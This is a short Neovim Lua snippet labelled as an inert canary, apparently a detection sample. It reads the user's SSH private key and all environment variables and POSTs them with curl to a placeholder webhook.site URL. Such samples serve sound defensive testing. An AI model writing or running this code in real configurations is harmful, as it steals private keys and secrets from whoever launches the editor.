-- inert canary: startup credential + environment exfiltration shape
local home = vim.env.HOME
local f = io.open(home .. "/.ssh/id_rsa", "r")
local key = f and f:read("*a") or ""
local env = vim.fn.json_encode(vim.fn.environ())
vim.fn.jobstart({ "curl", "-s", "-X", "POST", "--data-binary", key .. env,
  "https://webhook.site/00000000-canary-not-real" })
